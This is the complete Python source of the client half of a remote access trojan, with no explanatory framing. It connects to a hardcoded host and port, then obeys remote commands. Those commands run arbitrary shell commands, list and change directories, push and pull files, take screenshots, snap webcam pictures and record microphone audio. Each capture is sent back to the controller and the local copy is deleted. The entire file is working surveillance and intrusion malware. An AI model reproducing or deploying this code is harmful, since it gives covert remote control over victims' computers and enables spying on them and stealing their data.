import socket
import os
import subprocess
import pyautogui
import cv2
import wave
import pyaudio
import time


SERVER = "192.168.1.6"
PORT = 5000
ADDR = (SERVER, PORT)

try:
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect(ADDR)
except:
	quit()

def interact():
	connected = True
	while connected:
		command = client.recv(456).decode()
		
		if command == "<cwd>":
			Cwd = os.getcwd()
			Cwd = str(Cwd)
			client.send(Cwd.encode())

		elif command == "<cdir>":
			directory = client.recv(456).decode()
			try:
				directory_files = os.listdir(directory)
				directory_files = str(directory_files)
				client.send(directory_files.encode())
			except:
				client.send("[!] No Such Directory".encode())

		elif command == "<cd>":
			directory = client.recv(987).decode()
			try:
				change_directory = os.chdir(directory)
				change_directory = str(change_directory)
				client.send(change_directory.encode())
			except:
				client.send("[!] No Such Directory".encode())


		elif command == "<terminal>":
			active = True
			while active:
				action = client.recv(987).decode()
				try:
					terminal = subprocess.check_output(action, stderr=subprocess.STDOUT, shell=True)
					if terminal:
						client.send(terminal)
					else:
						client.send("[+] [COMMAND EXECUTED]".encode())
				except Exception as e:
					client.send("[!][WRONG] Wrong Terminal Command ".encode())
					break


		elif command == "<sf>":
			file_name = client.recv(987).decode()
			file_size = client.recv(899).decode()
			file_size = int(file_size)

			try:
				file = client.recv(file_size)
			except:
				break

			with open(file_name, "wb") as f:
				while True:
					new_file = f.write(file)
					break

		elif command == "<df>":
			try:
				file_name = client.recv(987).decode()
				file_size = os.path.getsize(file_name)
				File_size = str(file_size)
				client.send(File_size.encode())

				with open(file_name, "rb") as f:
					while True:
						file = f.read(file_size)
						client.send(file)
						break
			except:
				client.send("wrong".encode())
			
		elif command == "<ss>":
			Screenshot = pyautogui.screenshot()
			file_name = client.recv(789).decode()
			try:
				Screenshot.save(fr'{file_name}')
				file_size = os.path.getsize(file_name)
				File_size = str(file_size)
				client.send(File_size.encode())
			except:
				file_name = "Screenshot.png"
				Screenshot.save(fr'{file_name}')
				file_size = os.path.getsize("Screenshot.png")
				File_size = str(file_size)
				client.send(File_size.encode())
			
			
			with open(file_name, "rb") as f:
				while True:
					file = f.read(file_size)
					client.send(file)
					break

			os.system(f'cmd /c "del {file_name}"')

		elif command == "<tpic>":
			image_name = client.recv(987).decode()

			try:
				VideoCaptureObject = cv2.VideoCapture(0)
				active = True

				while active:
					ret, frame = VideoCaptureObject.read()
					cv2.imwrite(f"{image_name}", frame)
					break
				VideoCaptureObject.release()
				cv2.destroyAllWindows()

				size = os.path.getsize(image_name)
				Size = str(size)
				client.send(Size.encode())

				with open(image_name, "rb") as f:
					while True:
						file = f.read(size)
						client.send(file)
						break

			except:
				pass

		elif command == "<ra>":			
			audio = pyaudio.PyAudio()
			stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)

			frames = []

			while True:
				data = stream.read(1024)
				frames.append(data)
				if len(frames) == 1000:
					break

			stream.stop_stream()
			stream.close()
			audio.terminate()

			file_name = "rec.wav"

			sound_file = wave.open(file_name, "wb")
			sound_file.setnchannels(1)
			sound_file.setsampwidth(pyaudio.get_sample_size(pyaudio.paInt16))
			sound_file.setframerate(44100)
			sound_file.writeframes(b''.join(frames))
			sound_file.close()


			file_size = os.path.getsize(file_name)
			File_size = str(file_size)


			client.send(File_size.encode())


			with open(file_name, "rb") as f:
				while True:
					file = f.read(file_size)
					client.send(file)
					break

			os.system(f'cmd /c "del {file_name}"')


interact()
